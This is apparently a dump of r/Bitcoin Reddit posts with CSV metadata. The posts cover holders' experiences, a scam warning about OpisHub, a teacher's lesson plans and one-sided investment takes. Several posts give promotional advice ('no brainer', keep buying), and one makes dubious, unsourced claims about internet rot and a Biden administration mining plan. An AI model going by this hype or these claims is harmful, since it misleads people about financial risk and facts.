If the little guy ever finds a way to gain an advantage the loophole is quickly closed.'- the SEC Chair then threatens to investigate the redditors on [/r/wallstreetbets](https://www.reddit.com/r/wallstreetbets/) by tracking down their IP numbers with the help of reddit'- The [/r/wallstreetbets](https://www.reddit.com/r/wallstreetbets/) discord server is banned.All the years I talked trash about bitcoin, I apologise, now I genuinely understand the value of having a system not controlled by the government, where they can not on a whim decide to inflate the money supply and bail out their friends, while you carry the load in the form of additional taxes and inflation.",False,After GME I finally understand Bitcoin,u/[deleted],37,3771,0.99,https://www.reddit.com/r/Bitcoin/comments/l7mfd5/after_gme_i_finally_understand_bitcoin/,[]

I feel deceived by you.You requested to speak with me, so I took time out of my day to do so. We talked for 20 minutes, during which time I conveyed to you my sentiments about the Bitcoin ecosystem and the matter of MtGox's collapse. My message was unambiguously a positive one. I didn't focus whatsoever on the personal funds I lost at Gox. Indeed, the impetus for your call was my heartfelt post on Reddit. Yet, you ignored everything I said. The only quote that you published from me in the Journal's cover story was ''That's gone now,' said Mr. Veerhoos, who is based in Panama City, Panama. 'There's no chance of getting that back now.'' Is that really the takeaway you had from our call and from my letter? Is that your idea of journalism? Did I come across with the sentiment of a despairing investor whose confidence has been rattled? It seems you were happy to completely ignore my sentiments, preferring instead to cherry pick the one fact that is least important, in order to paint a narrative that Bitcoin's biggest problem is that it's not 'regulated.'  I didn't expect you to quote everything I said, but should you not have maintained at least a modicum of fidelity to my message?I have dedicated my life to building and supporting the Bitcoin project. I don't give a damn about the money I lost at Gox. That's not important. What is important is that Bitcoin is resilient and enduring, and will continue to grow and change the world for the better. It is a story of human progress through technology. It is a story of the good seeping into the cracks of a corrupted financial system. It is a story of passionate people struggling against all odds to remedy the calamities brought down upon society from the most potently misguided people and institutions on Earth. Next time you spend your efforts casting a pall over this cause, please don't ask me to contribute mine.  -Erik VoorheesPS - I will be posting this letter openly on Reddit.

I think I can almost be considered an OG by now. Recently, I've started to observe my emotions more seriously during the market moves and I've had valuable insights while doing so: *what I am feeling right now is probably very close to what many other investors are feeling*. This is great to know. It helps me to estimate how the market might react in real time.I've joined this sub in 2013 and my first buy was in Dec 2013 during an *epic* leg up. Bitcoin crashed upwards like I've never seen again. Incredibly, though, I almost timed the top perfectly and bought in right before it crashed down again, ultimately moving from around 1k to 350 or so. Imagine my feelies. I was naive and very new. But the reason I've joined was a bit different than the reasons moon bois are joining today. Back then, Bitcoin was pure magic. And it was subversive. It was a big F U you to the banks. That was the selling argument. And it was always clear to me since then that Bitcoin is either going to 0 or to infinity. I still believe that today. After my first buy, I was in the red immediately. Double digit percent loss. But my conviction was strong. I've spent the next months reading and understanding BTC. I've practiced with lots of different wallets, I've sent transactions around (they were still free back then, yes, 0 transaction fees) and generally got comfortable with using it. I noticed that, yes, this technology is insane, and yes, I can send anything to anyone, it takes a couple minutes, and yes, it's almost free, and yes, nobody can do anything about it. Remember, I was a complete noob who was down 25%, 50%, 65% his investment. But I'm not an idiot. I know it will go to infinity and the chance of it going to zero is so low that I've decided to keep buying like a retard. I've started putting almost all the money I've got into it (I was a very poor student back in the days, don't get too excited). I figured 'the lower my buy-in price is, the earlier I will be in the green'. Long story short, I've been red for almost two f*cking years. Can you imagine being red for two years and still keep buying? One part of me was extremely scared ('I am YOLOing all of my money into this thing that might just fail') and extremely bullish at the same time ('this shit will go to infinity but it might take a couple decades'). Then 2017 came and we've experienced a wild increase of the price to 20k. Even my family got involved at some point because they've seen my huge gains and got FOMO. My mother turned her 5k into an equivalent of 50k. They started to interfere with my plan and give me (well meant) suggestions on when I should sell. Of course they didn't get it, they are too old to imagine a cyber future where this stash of satoshis will be the ultimate commodity. There was insane FUD around, including the biggest FUD I've ever seen, which was the block size wars (look them up if you don't remember it). Then the crash of 2018 came and everything evaporated. However, from this bull run onwards, I've never been in a loss ever again. The price never went lower than my average buy-in but that actually made my feelies even harder to manage. Now my thoughts weren't 'Oh no, you could end up with a loss' but 'OH NO YOU MIGHT END UP BEING TOO STUPID TO TAKE A PROFIT' which was way more frightening and ego-crushing. Although I had hands made of diamonds, I've had several moments in the year-long crash that followed where I almost sold. We saw 20k, 10k, even 6k, and I still believe that the fact that I use a hardware wallet (and not keep my sats on an exchange) is what ultimately saved me from making one of the biggest mistakes of my life, which would've been selling my stash at 6k.Fast forward 2020. How things can change. The covid crash to 3500 was completely different. I've seen the price drop in real time which triggered the most bullish sentiment in me that I've ever experienced. Without a doubt of seeing this as an incredible opportunity to buy, I threw a bunch of money in and converted it to BTC. I knew that BTC was on a fire sale! And then we've seen the beautiful (but this time not so mind-bending) bull run of 2020. Now, BTC is not only about cypher punks anymore. The game is world domination. I started to understand the waaaaaay bigger implications that this will bring to the world. Money is broken. The world is broken. Our governments are going nuts. Our politicians are noobs. And society is full of fear. I wonder if there is an asset that is invincible and that spreads freedom tech by infiltrating the hearts of people by promising them huge gains... Mhhhh! And now we're here. I look around this sub and all I see is myself. Many new people in this sub, many people afraid of losing their hard-earned money. I completely get it. It's how I felt. It is a lot harder to stomach if you haven't put in the time to learn about the tech. But that's why we're in this sub, to support each other. And I'm not saying that to sound corny, I'm saying that because I've experienced it 100% myself. Without this sub, I wouldn't have been able to recharge my batteries, rethink my strategy, reaffirm my conviction, and observe the development of bitcoin in real time. I wouldn't have seen masses of people giving emotional support to each other, because at the end of the day, this is what controls these price movements. Emotions. So, if you feel afraid right now. If you feel like you've made a huge mistake, if you feel like this could've been a bad decision, then good, this is what a huge part of the market is thinking right now. Observe your feelings, judge them with distance, extrapolate them to the masses of people also looking at exactly the same chart as you do. And start using that information *for you*. Fear is a part of the equation and the reason I've written up this long-ass post is so you can appreciate this without having to go through hell first, like I did. What you are feeling right now is almost 'priced in'. Money can be made when there is blood on the streets. That's my advice. Do not buy the next best shitcoin. Nothing is even close to becoming a 'replacement' for BTC. Ask yourself why you like Bitcoin, learn as much as you possibly can (I highly recommend listening to the hundreds of hours of articles in the Bitcoin Audible Podcast) and keep stacking if you know why you're doing it. That's it, I'm out! Peace! TL;DR: Breath in, breath out, and HODL!Edit: Wow this one blew up. Thanks for all the kind words, I'm happy that I could help at least some of you.

She goes off on a diatribe and mocks him every chance he gets for his 'foolish' beliefs and how he spends his money on buying and holding bitcoin... she consider any bitcoin that he holds to be 'lost money'.I actually saved this when I read it back years ago to see one day how it would age... man talk about the worlds biggest I told you so. She had zero faith and respect in her husband. I hope he has a garage full of lambos in his giant mansion.Here are some of the highlights  snipped for your own entertainment:'-------&#x200B;'My husband (I'll call him John for the sake of anonymity) and I have been married for a little over 5 years now and everything has been going well up until a year or so ago. We were planning on having children and everything. Now my life feels like it is at a complete stand still.'Skip to 2013...' We are both avid redditors so when we find a new subreddit that we love we get excited and start sending each other links to see if we can get the other one interested  He finds out about bitcoin and is sending me links constantly about it.  (r/bitcoin) It goes from 'check out this cool technology' to absolute cultish behavior in a very brief period. I would say 0-100 in probably 2 months. He starts taking every dime we have and buying them as quickly as he can. **He actually set up a feature that BUYS MORE ON A WEEKLY BASIS** after our paychecks come through. The worst part is he didn't even TELL ME he did this. He gave me this arrogant response about doing what's best for us and our future kids.Overall, and I'm not exaggerating, I would say **we have lost over $22,000.** I kept telling him to sell as the price was rising and he promised me a big year in 2014. **The price kept falling and he CONTINUED TO BUY MORE.**  He makes more money than I do but we are building a future together and we have a shared bank account. He kept telling me this was for our kids college fund, to buy a house, etc. The money...I can get over as people spend money on other stupid crap like boats they will never use but this isn't even the beginning to the absolute craziness I will see out of him over the coming year.My husband starts bringing up fucking bitcoin at these events. MY events for MY job. People here have a lot of money and he knows this. He saw this as some kind of opportunity. He goes on and on about how taxes are theft and bitcoin is a way out. The dollar is about to collapse, banks are destroying the world, etc. You are supposed to make light hearted jokes about how their football team is doing, not get into these political discussions. He knows this too since he's been coming to these events with me for years.It starts off small where I laugh it off and say 'ohhhh John, he's into technology and gets a little too excited'. He saw this as condescension. The car rides home? Full on fights about how **I don't get it and I'm going to be left behind.** I felt like I was fighting with some type of evangelical Christian (I have been in plenty of these growing up). He ironically rips into religion any chance he gets but he is **absolutely part of a cult full of insane people.**Keep in mind as this goes on he is still buying more as the **price goes down telling me we have a great opportunity on our hands**.  He ignores long term trends and focuses on these specific time frames to show me how stupid I am. Yes, my husband called me STUPID over THINKING I do not understand it.I feel like I have read more about bitcoin than he has because he won't discuss any downsides with me. He tells me all problems will be fixed and **we are in on the ground floor**. He seems to be in a constant good news bubble about this **when no one actually cares**. Most of the responses he gets from people in public are feigned interest until they can get away from him or they just tell him they don't care if the converstaion lasts more than 2 minutes. **I am embarrassed to be around him.**After a **recent price crash, he actually bought more using our vacation fund** that I have been saving away for AND planning. **All gone, in bitcoin never to be seen again.**I am sorry for the long rant but this is my life now. I have tried everything. I have tried reasoning with him. I have tried explaining to him that he should not have sole control over our money. **He is so confident that he slyly brings up selling one of our cars to buy more**. He didn't come right out and say what it was for but I can guarantee you it was to buy more. He is ruining my job and **robbing me of happiness.**I used to consider him a smart guy and **I never, ever thought he would succomb to basically being brainwashed by a bunch of clueless idiots on the internet who seem to know absolutely nothing about finance or the real world (**r/bitcoin**).** I don't know how familiar people are here with bitcoin but if you go to their subreddit, you will see exactly what I'm talking about.

I am not religious in any way but my family most certainly is. **I feel like I couldn't even bring up divorce and I want to save my husband.** I want him back to the way he was. It seems like he is addicted to a drug but since he doesn't realize it, everyone else is wrong. I don't know if I should have an intervention or just walk away and hope he comes to his senses when **I'm staying in a hotel for a few weeks.**Again, I apologize for the length but I want you to feel the way I feel so you can understand the advice you are giving.

This is not financial advice but my own research analysis and I am open to being corrected as I am still new. I see a lot of DD for stocks but not as much here so I am hoping we can also get some more quality content here to share knowledge. I am someone who has bought and sold bitcoin at a loss back in 2017-2018, and then again 2020-2021. Yes, I saw all the 'HODL' posts, but I was only in it for attempted financial gain. I've only recently spent the time to look into bitcoin and become a believer.**Supply**: First, Bitcoin has a fixed supply. Right now there are 900 bitcoins mined per day. Every four years the number of Bitcoins produced per block (created every 10 minutes) are cut in half. Currently the mining reward is 6.25 Bitcoin per block. In 2024 it will drop to 3.125 BTC per block. So we are beginning to see something we learned in our high school Economics class called Scarcity.[https:'/'/institutional.fidelity.com'/app'/literature'/item'/9901337.html?pos=T](https://preview.redd.it/xqveh5ei8vk61.png?width=359&format=png&auto=webp&v=enabled&s=0dd33323fd7f3b0077d52dff57734068bf2a3da5)**Demand**: Next is demand. It doesn't matter if there's less of a resource no one wants. There is a lot to look at here (i.e. Bitcoin ATM installations increased by +85% in 2020 to 11,798 terminals, outpacing the previous year's near +50% rise by a significant margin, according to data source Coin ATM Radar). But the big one we are all most excited about is the change in institutional money flowing in. For those that don't know Metcalfe's Law, it holds that as the number of its users grows linearly, a network's value (or, by inference, the bitcoin price) grows geometrically. In other words, there is a cascading effect where more and more institutions begin exponentially buying in *worldwide*. Right now 30% of all U.S. buyers are institutions. This is a big deal because institutions have more money than you, and that means if they keep buying, our clock window to buy at our current price is now ticking.[https:'/'/ir.citi.com'/peFJTnzeEoMSIAEFlwH12VeM5d&#37;2BCckWNrsO9lxpmyWezrz5V&#37;2Bx&#37;2FfRvm0gv6cWRpDHGWtIk7sTME&#37;3D](https://preview.redd.it/wc54qsbk7vk61.png?width=456&format=png&auto=webp&v=enabled&s=3fec2dadc57844a75710c4ca65856680c5aedcf7)**Indicators**: The first decade was marked by speculation and pushback. And Bitcoin prices reflected that. I know for a lot of us, me included, we want indicators to show that prices will go up. But something I'd like to propose for your consideration also: The maturation of an ecosystem tends to result in fresh consolidation. Because we are still in a stage of Fear, Uncertainty, and Doubt (FUD), this is good news for you - it means we are only now beginning to exit the early adaptor stage. It's not too late to buy. As more and more people have bitcoin, it will begin its slow inevitable march towards mainstream as a dependable store of value. This is why the next chart I want to show you is not just money, but people. More and more people are bitcoin owners. More and more people start talking and googling and investing. Metcalfe's Law, remember?[https:'/'/www.lookintobitcoin.com'/charts'/wallets-greater-than-1-btc'/](https://preview.redd.it/ndk2uz1t7vk61.png?width=1117&format=png&auto=webp&v=enabled&s=e70735fe09f3f12d5507e51b0838edd0afeccb6f)**Inflation/Depreciation**: When I was a kid I remember reading a book called 'Rich Dad Poor Dad' where the premise was to put your money in assets that make more money, not less. Putting your money in things that depreciate (i.e. a car) loses you money over time, while things that appreciate (i.e. a house) make more money. A popular Bitcoin valuation chart is called the Stock-to-Flow (S2F) pricing model. Notice how as Bitcoin becomes more scarce due to halving's, it exponentially grows. Next, notice how your hard earned U.S. Dollar has depreciated by 99% the past hundred years to gold, which has been traditionally the 'gold standard' of storage. Guys, this is seriously starting to look like a no brainer to me.[https:'/'/www.lookintobitcoin.com'/charts'/stock-to-flow-model'/](https://preview.redd.it/wl841d6g7vk61.png?width=1136&format=png&auto=webp&v=enabled&s=f84d9cdbd6f29315f06903b9a0cc421ae36eebda)[https:'/'/seekingalpha.com'/article'/4366155-u-s-dollar-devalues-99-vs-gold-in-100-years-gold-price-crosses-2067](https://preview.redd.it/ycii0zfhgvk61.png?width=1492&format=png&auto=webp&v=enabled&s=0d161ca9b3a681d0756b3af2078fd728acd07a90)**Regulation**: This something not completely known to any of us. Despite the price volatility, what if the U.S. Office of the Comptroller of the Currency (OCC) and Securities or Exchange Commission (SEC) tried to in some way limit or outright ban Bitcoin? I take comfort that institutions are adopting and even big retail investors are adding Bitcoin as part of their overall asset portfolio. Regulation is not always bad and can provide us a layer security from a 'Mt. Gox' happening to us again. There is a stable coin called Tether that is being investigated and other legitimate FUD concerns. But with Coinbase's soon IPO, and large positions on the news from the likes of Tesla, there is more safety and certainty. Do understand that your faith is currently paid to you at a premium. Once all FUD and volatility from Bitcoin is removed, it's skyrocketing price will reflect that.[In December 2020, the SEC announced they would allow crypto-focused broker-dealers to operate for five years without fear of an enforcement action provided that they can verify if they have possession and control of customers' digital asset securities https:'/'/www.sec.gov'/rules'/policy'/2020'/34-90788.pdf](https://preview.redd.it/gfyk4m81mvk61.png?width=644&format=png&auto=webp&v=enabled&s=e8328f643752c9ffd0dcb61232402386559a5597)**Competition**: Cryptocurrency is not just limited to Bitcoin, there are many 'altcoins.' But analysts have been pointing to Bitcoin as the 'north star' of all other cryptocurrencies and welcome mainstream adaption of cryptocurrencies as a portfolio diversifier. Bitcoin helps illuminate the financial industry's path. There are new technologies and advancements being made too for the 'inefficiencies' of Bitcoin. Efforts to improve Bitcoin's processing speed are underway such as a new scaling technology called the Lightning Network.[https:'/'/ir.citi.com'/peFJTnzeEoMSIAEFlwH12VeM5d&#37;2BCckWNrsO9lxpmyWezrz5V&#37;2Bx&#37;2FfRvm0gv6cWRpDHGWtIk7sTME&#37;3D](https://preview.redd.it/t74wwd7edvk61.png?width=660&format=png&auto=webp&v=enabled&s=26ee74cfb64d8d26ec2b505894cbc57b572cad03)**Conclusion**: Bitcoin has gone mainstream and is considered a legitimate asset class of digital gold by more and more investors. Bitcoin has a proven supply dynamic (S2F) and demand dynamic (Metcalfe's Law). With banks printing money to infinity, the question for you is:*With all this information, is bitcoin worth a portion of your portfolio?*If your answer is '*yes*' then Dollar Cost Averaging (DCA) of buying and holding bitcoin appears to be a viable investment. I do not think this is an asset class to sell anymore. Notice nowhere in this writeup did I talk about getting rich quick off bitcoin's prices. I'm a firm believer that 'time in the market beats timing the market,' and so I will be buying and holding because I believe in the future of bitcoin.TLDR - Be a long term HODL and start stacking satoshis for your future's sake.",False,Due Diligence on Bitcoin,INACTIVE,146,3382,0.97,https://www.reddit.com/r/Bitcoin/comments/lx4svz/due_diligence_on_bitcoin/,[]

Nobody wants to talk about bitcoin. Nobody wants to discuss mass adoption of bitcoin. Nobody wants to talk about liberating the Lebanese freelance artist or the Iranian just trying to buy games on steam or the village in rural Kenya that is located a 3-hour-walk away from the closest bank. Nobody wants to talk about DLCs and smart contracts on bitcoin or the best non-custodial lightning network wallets. No one is talking about taproot.                No one is talking about how the creator of bitcoin never sold his coins. People are forgetting the first cryptocurrency that was ever created. People are forgetting metcalfes law.                 What I find ultimately more disturbing is that during the 2018-2020 bear market more people were talking about / cared to talk about bitcoin than altcoins. It just feels like a hivemind of 'pump my bags' and little more.               This is just a slight rant. It's like everyone there delusionally believes that an altcoin will surpass bitcoin and become the standard. If there is going to be another bear market, I welcome it. Just so we can go back to talking about bitcoin and lightning and the technology aspects of it all.                 EDIT: I strongly feel as though the majority of the new users that we have accumulated since this bull run began are coming from /r/wallstreetbets and /r/dogecoin.

EDIT 2: 'superior technology' showed up in 2017 in a slew of different flavors and not a single altcoin actually surpassed bitcoin.                EDIT 3: I see that there is a cross post of this thread to the cc subreddit. To further refine my claims to the belief that no crypto will surpass bitcoin, I responded to a comment someone else here made with the following: All of these questions summarize 'Why bitcoin is the next bitcoin.'' >Which coin is the 'next bitcoin?' or in other words, the one coin that will replace bitcoin? Why is it that coin and not bitcoin? And how do you convince all of the banks and the traditional financial system to switch to that coin and not use bitcoin?

Of course I Googled Bitcoin lessons, and of course I could make my own. I'd really like to see some of what's already out there!edit:typoEdit 2: Wow this blew up! Thanks for all the responses. Some general clarification - I'm not interested in teaching the technicals, yet. Many students have already asked me about Bitcoin and other coins. There are many ways to explain what Bitcoin is, and I see many more in the comments! I do not plan on talking anything market related. I just want to answer their question what is this Bitcoin thing people are talking about? And hopefully open the door to future lessons on what money is and the history of it. Also: I teach at a Charter. Long story short - I do what I want!Edit 3: Some people are saying that because they're 8th graders it's not worth teaching them. When students are constantly coming up to you and asking you about BTC and DOGE and SafeShit, I liken that sentiment to teaching them about sex. They are talking about it themselves, so why not treat them as young adults and educate them? Refusing to respond to a student about Bitcoin will likely end up with them buying some scam coin. We teach then stocks as well. Not wanting to teach them what it is because it can be likened to gambling is absurd.Edit 4: üòÇ Wow there are some comments from people who obviously have some residual trauma from people who hurt them. Read the damn title. You can always tell who isn't a teacher - they are always trying to tell teachers how and what to teach (with horrible grammar, I may add üôÑ). Maybe, for the first week of class while we are getting students acclimated to being back in school, we ease into content. Instead, give them lessons on material not covered in a curriculum and try to forge relationships going into a new year. Also if you don't like Bitcoin, why the fuck are you on r/Bitcoin? Sounds like you need r/buttcoin.Edit 5: Just found out from members of my grade level team that many of them are wanting to talk finances and whatnot and want to plan together to make our little free lessons a little more cohesive and centered around financial literacy. Because we will be using the first week to go over norms and protocols and all the other stuff, we each now have a total of 2 hours over the week for a free lesson, particularly ones that students have shown interest in (e.g., Bitcoin). This means I am now planning a 4 part lesson about money, starting with bartering, to coins, to paper money, to fiat money, plastic money, and then to internet money. This is going to blend very well with another teacher who is going to give a crash course on what the internet (of information) is. I appreciate the help!",False,"I'm an 8th grade science teacher.

I thought I might share some reflections. I'm seeing a lot of newcomers (welcome!) as well as some sophomore types with questions, ideas, admonitions, and the like. Pull up a chair, I've been around these parts for a while. And if anyone starts in with the 'but yr account is only 2 years old' bullshit... come on, use your head.First off, as Ecclesiastes 1:9 states:>What has been will be again,>  what has been done will be done again;> there is nothing new under the sun.Over the last 7 years I have seen all these questions about what to do, these statements of selling, and others commenting how stupid and ignorant anyone who sells right now must be. People have called me a fucking moron for daring to part with some of my bitcoin, or argued with me that I don't understand what I did. They are sad people (jealous? myopic? entitled? I still don't know what they are trying to prove.) Secondly: I'm certain a number of you will not believe my story. That is your right. I will not provide tx-id's or any other form of proof. I just ask that you look at my post history and ponder ‚Äì either this guy made up a story several years ago and stuck to it, posting every so often between /r/bitcoin and /r/financialindependence for magic internet points or maybe he is telling the truth. Seriously; if you doubt my story look at the post history and see if that helps, if not so be it.If you care about the deeper parts of my story, and the lively debates/admonitions/disbelievers check out my previous posts:[Short basics](https://www.reddit.com/r/Bitcoin/comments/bpxgyq/since_shit_is_cray_again_in_btc_land_i_sold/)[More details / 1 year retired reflections](https://www.reddit.com/r/financialindependence/comments/b2bfko/fire_1_year_in_a_few_reflections/)[2yr retired reflections]( https://www.reddit.com/r/financialindependence/comments/etgc2q/fire_2_years_in_a_few_more_reflections/)[Selling, Taxes, Coinbase]( https://www.reddit.com/r/Bitcoin/comments/fxho4v/stop_the_bullshit_if_you_sell_your_btc_on/)**The story** I got into bitcoin back in 2013 or so, reading about it and really going down the rabbit hole. I am a scientist, and it is my nature to go deep on things of interest. One thing I learned in my graduate studies was how to learn (how to research). For you whippersnappers ‚Äì that means more than Google and YouTube. So I learned, I read, I watched interviews, I set up a node, I mined shitcoins to understand how that worked (and traded them for bitcoin in the end.) Nobody I knew was into bitcoin, and nobody would listen to me about it. I tried to get my brother interested. I tried to get a tech friend interested. Both of them agreed it was interesting but not enough to acquire any bitcoin (this was around the time of bitcoin being just under $1k, before it dropped for several years post MtGox meltdown). So I carried on alone, with just the interwebs to console me.In 2017 when bitcoin hit $4,000 or so, I sold 40 - enough to pay off my mortgage and cover my original costs to acquire all my holdings (avg sale price $4320). If bitcoin ate shit and died, I had a good ride, and had a paid off house to boot. I think it was a week or two later that it was $8,000. Then soon after it almost hit $20k and started dropping. I didn't panic, but I woke up in mid-December and my brain screamed don't be greedy to me. I listened to my brain and sold 60 BTC at around $15.6k each. Additionally, as I had my coins on Coinbase, when they opened trading for BCH in late December I dumped them within the first hour for around $3550 each. When all was said and done I had made somewhere near 1.5M USD. If you have questions about how much I paid in taxes, how I moved the money, if my bank gave a shit (spoiler: they did not) etc. it's covered in [this post]( https://www.reddit.com/r/Bitcoin/comments/fxho4v/stop_the_bullshit_if_you_sell_your_btc_on/) with details asked in the comments. You also get to see people tell me I am wrong, so there's that fun as well. I kept the rest of my BTC, and watched the price shrink down over the next couple years. I wondered if I had made a mistake by not cashing out, missed my big chance for maxxx profits or whatever, but it didn't really matter that much because a few months after I made the initial money and paid my taxes, **I fucking retired**. Yes, as of almost 3 years ago, I retired. It wasn't only because of the bitcoin ‚Äì I had saved money, had a 401k, and an IRA. I was on my way to a modest retirement somewhere in my 50's or so if I wanted it, but then BOOM, I had a huge nest egg, a paid off house, other savings, and additional bitcoin for the future. Cool. kthxbye work world!I have spent the last 3 years leisurely pursuing my own things like art and music, woodworking, collage, gardening along with sleeping in and lots of meditation and porch dwelling. There have been several small tragedies in my life since then (parents in poor health, for one) and so I have been able to tend to that more so than I could if I was working. Being retired has given me so many options and so much control over my life. I love it.Some of you might be thinking something along the lines of - Now here we arebitcoin is worth $40k so roughly speaking this guy (me) lost out so far on about 2.4M after taxes. There's also the fact that if I had kept working these last 3 years I would have additional income/savings that I could have invested so let's round up to 3M after taxes, assuming I sold the 100 BTC now and the BCH immediately (I'm not a fan, and actually am surprised it didn't die). How do I feel about losing out on $3M (and counting)? Honestly, not particularly bad.Here's the deal ‚Äì when you get to a certain point in your net worth, where you can cover your costs for your lifestyle and more (and this number is different for everyone, for me I'm really chill, so no lambo interests) the money sort of converts itself into a score like on a video game. I can look back and think oh man, 3 million fucking dollars more! Oh shit! but do I lose sleep over it? No. Do I kick myself? Not really. My score is lower than it could have been but in return, I got to help a friend die peacefully, I helped another friend pivot his business, I moved to a new city and bought a cool house (still own the old one as a rental, but maybe not for much longer), and I get to wake up every day and do exactly what I want to do (minus covid issues). It's really nice to be out of the rat race. It suits me well. I know now that I could have made more - but at the time I had no clue, and there is something to be said for the comfort of the sure thing. My base take is this ‚Äì we only have so much time on this planet, and I'd like to maximize my control (vs. my wealth) as much as possible. It would be hard to imagine reliving the last 3 years with a full time job, and I don't care to dwell on what might have been. I hit my retirement number (1.5x my number + remaining BTC) and GTFO of the system. That money has grown in the funds I put it into, and I never touch principle. My remaining bitcoin became and remain gravy and I plan on hodling until it doesn't make sense anymore. My advice to all of you is to do your research, know your game plan for selling (I didn't really have a solid one, honestly), be excellent to each other, and live that life. Ignore the noise ‚Äì from nosy people in internet forums, from grouchy jealous jerkoffs, etc. This is your deal. I'm happy to answer any questions.

There are many reasons this is great news, but I've also noticed that the quality of posts and discussion about bitcoin has plummeted. We really aren't having the important discussions with nearly the frequency that we should. Now I know some of you won't like me saying this, but it really does need to be said. Someone needs to be realistic with our new friends and give them the bad news and tell them the things they don't want to hear. So here goes.I feel that we're due for a correction, and I really don't think we've even gotten started. I've been around this rodeo a few times and it always -feels- different in the moment, but in reality it's mostly cyclical. In 2017/2018 we saw a months long sell off after the run up to 20k that saw Bitcoin fall to 4k. That's more than 75% in the red from the preceeding ATH. Refer to this figure later. I think we're going to see a few -15%'s, maybe even a -20% or -30% before we're really back in bear territory. When it comes I expect the new crowd to go through the same things I and many others went through when we were the new kids. Weak hands will get shaken out. People getting way over leveraged/exposed and taking out credit to buy BTC are going to be burned hard and maybe leave the space forever. Some will risk it all and put their house on the line, and nearly all of those will lose their home. People will buy into BTC expecting their investments to double overnight, everynight.This shit happens every time. The vets come in to tell the new guys not to panic, or not get into serious debt chasing the bull run, and we get ignored. People will tell us we're trying to short, or how we might be causing this guy to miss out on SICK GAINZ by telling him not to take a second mortgage out to buy BTC. In reality, most of us really do care about the space, and want to see it grow. It hurt me every time I read about someone blowing years of their life away trying to chase the dragon at the end of the bull run. It hurts me more now to see it happening again, and the same arguments getting thrown about as justification for being reckless with their finances. Refer back to that -75% figure I dropped before. Would you rather that be the value of your house? Or would you rather it be the money you saved over time to buy ‚Çø responsibly? I made my own mistakes too, thankfully not with my house or something else vital to me, but mistakes nonetheless that put me in severe debt when I tried to chase BTC back in 2013. I only just now climbed out of that hole. (I literally made the last payment before posting this)Bottom line is that BTC unfortunately attracts the get rich quick types, and when shit hits the fan they are NOT happy. They will panic sell to stop the bleeding. If you gamble your life savings on Bitcoin while it's at ATH because of FOMO, it's going to really hurt. The harsh truth of it is, if bitcoin is going gangbusters and you don't already own your position, you're too late for the bull run. Your best bet is to accumulate over time, so that in four years when we're looking at this situation again you can be the guy making five figures in his sleep, and making posts like these telling the new guys to have a longer term view.I dunno, I just don't want to see people FOMO themselves into crippling debt like I did, and have heard so many horror stories about. It's the beginning of a very wild ride over the next couple of months.EDIT: With this getting a lot more attention than I thought it would, I'd like to just say thank you to everyone for even giving this the time of day. I was initially replying to another comment on a different thread and the whole thing got a little long winded, leading me to just post this here instead. I just wanted to clarify a few things that I feel got left out or that I missed the mark on:1. I am very bullish. I do not believe we're crashing imminently, but rather wanted to caution those getting sweaty palms of what could happen should they get too emotional and overextend while we're in uncharted territory. 2. I don't think we're going to follow a picture prefect pattern of the previous bull runs. The price is entirely unpredictable, and if one could tell you with any certainty what the price or market sentiment would be at any given time they would have to be a time traveler. 3. It is never too late to get into BTC. But you should temper your expectations when you're a late entry to the cycle.

This is probably what Biden's advisor meant when he said that his administration was mining Bitcoin, because from what I've heard this kid say in those twitter spaces, the stuff he's trying to do for them would involve mining and much more. His plan is to make Bitcoin the GPS and Atomic Clock of digital information, a solid accurate ledger to store important information away from things like internet rot or wiki edits.For those who don't know, our current internet is rotting away. When you search on google, it claims to have billions of results for any subject, but when you search through those subject's results and actually dig through the pages, you only get on average around 350 to 470 links.The other billions? They've been lost to internet rot, the result of links being lost or destroyed from things like servers going offline, losing the data of billions of results per search, the loss of things you used to be able to find online but can no longer locate.This apparently is a problem for the government as a lot of those lost links were links used in actual court cases, leading to digital evidence being lost that in some cases have been used to set legal precedents.

It's still up, but the main point was that they approached me to shill their shitcoin for money and that they are really shady, it has many red flags and very much looks like a scam.Then one of the scammers (Scammer 2) sent me a message that he didn't like it, and that I was deleting his comments on my post (lol he has less than 50 comment karma, they just got deleted, of course I didn't do anything). My post only had like 35 or 50 upvotes at this point and it had already been 2 hours since I posted, the post wouldn't have become very big - but the scammers decided to buy downvotes, bringing it to below 0 within minutes, [see also here](https://old.reddit.com/r/CryptoCurrency/comments/o75scd/the_scammers_behind_opishub_didnt_like_the_post_i/h2wxc7e/). The mods deleted a post about this that I made yesterday (because it broke another rule, so I understand - but that post is probably also the reason why my original post is above 0 again), so here I go again: these guys are obviously shady, some examples:* one of them (the one that originally approached me, Scammer 1), [pretended to have just stumbled across the project](https://old.reddit.com/r/beermoneyuk/comments/n15mwk/passive_phone_gains_opishub/) instead of saying that he was part of the project **EDIT:** just saw that the post was deleted, it's archived [here](https://web.archive.org/web/20210429143341/https://old.reddit.com/r/beermoneyuk/comments/n15mwk/passive_phone_gains_opishub/)* they wanted to pay me (and most likely others) to shill their project* they [openly told me](https://imgur.com/a/rgw1HsB) they would do vote manipulation and upvote my posts about them and then, well, bought downvotesSo even if the coin would not be a total scam - which I really think it is - they are obviously doing shady stuff. I have already listed the obvious red flags that make them look like your average scam coin, here they are again, slightly adapted:* they use your phone's CPU for mining* the CPU is used to power scientific research (of course they don't say what 'scientific research' they are talking about anywhere). And I work in science: of course I would rather use the CPU of a few phones than, well, the powerful computers we have, just as much as I would rather ride a few cats that are tied together than a horse* 'each transaction gives a small % to charity'* they plan to be super eco friendly and plant trees* 'our primary promotional point is that it adds people's incentive to get  their friends and family on board , therefore we will have a reffer@l scheme in place', so it's officially a pyramid scheme* the token (and app) will launch soon ‚Ñ¢Scammer 1 had also told me they 'have received 3.5million pounds in the last week to utilise to get this project off the ground'. If you look at their social media activity etc., it's all extremely basic and unprofessional (but check out their Twitter, it's kind of funny - they really try to seem 'sciency' but don't really know anything about science I think. The followers are either also bought or baited by some fake giveaways, very few seem to be normal, non-spammy accounts) - no company with multiple millions funding would present themselves like that. Also look at the [start of the email](https://imgur.com/a/tbq5YZ9) they sent me in beautiful red, Scammer 1 didn't even remove the 'initial contact', which I think is hilarious.So again, if you see positive posts about this project, it's either the scammers or people with less morals that they approached. Stay away from them as far as possible, at least don't give them money, your personal information, or go to their website/ download their app so they can send you viruses.",False,I made a post about the scam OpisHub yesterday.

